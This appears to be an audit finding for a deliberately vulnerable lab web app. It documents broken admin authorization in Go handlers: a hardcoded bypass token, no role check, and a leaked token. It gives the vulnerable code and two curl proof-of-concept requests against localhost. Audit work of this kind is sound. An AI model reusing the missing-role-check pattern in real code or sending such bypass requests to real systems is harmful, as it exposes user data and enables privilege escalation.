# C3 — Broken Authentication on Admin Routes (V07)

**Severity:** Critical  
**CWE:** CWE-285 | **OWASP:** A01:2021  
**Status:** Confirmed (cold-verified)  
**Source draft:** `piolium/findings-draft/p7-007-v07-broken-auth-admin.md`

## Summary

The `/admin/orders` and `/admin/users` endpoints accept either (a) a hardcoded `X-Admin-Token` header value, or (b) any logged-in session. There is no `role == "admin"` check anywhere. Combined with V09, the token is publicly disclosed by the unauthenticated debug endpoint.

## Vulnerable Code

`handlers/admin.go::AdminGetUsers` (and `AdminGetOrders`):

```go
token := r.Header.Get("X-Admin-Token")
if token != config.LabAdminToken {
    sess, _ := middleware.GetSession(r)
    if sess.Values["user_id"] == nil {
        w.WriteHeader(http.StatusForbidden); return
    }
    // BUG: only checks if logged in, not if role == "admin"
}
// ... full data return including password column
```

The constant `config.LabAdminToken = "lab-admin-bypass-token"` is exported.

## Impact

- Unauthenticated administrative read of all orders and all users (including plaintext passwords, V08).
- Trivial one-step privilege escalation when chained with V09.
- The `role` field is not enforced even for session-based access.

## PoC

**Path 1 — Token bypass (no session):**
```bash
curl http://localhost:4443/admin/users -H "X-Admin-Token: lab-admin-bypass-token"
```

**Path 2 — Session bypass (any user):**
```bash
curl http://localhost:4443/admin/users -H "Cookie: restaurant_session=<any_alice_session>"
```

Both return 200 OK with the full user list (including `"password": "Admin@2024!"` for admin).

## Cold Verification

Re-read source: confirmed the `else` branch has no role check; source comment in handler explicitly acknowledges the bug.
